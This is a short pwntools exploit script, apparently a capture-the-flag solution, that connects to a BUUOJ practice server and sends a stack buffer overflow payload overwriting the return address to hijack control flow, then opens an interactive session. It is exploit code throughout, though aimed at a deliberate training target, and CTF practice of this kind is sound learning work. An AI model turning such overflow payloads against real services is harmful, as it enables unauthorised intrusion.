from pwn import *
# p=process("./bbys_tu_2016")
p=remote("node4.buuoj.cn",28731)
# elf=ELF("./bbys_tu_2016")

p.recvuntil(b"This program is hungry. You should feed it.\n")
payload=b'a'*(0x14+4)+p32(0x0804856D)
p.sendline(payload)
p.interactive()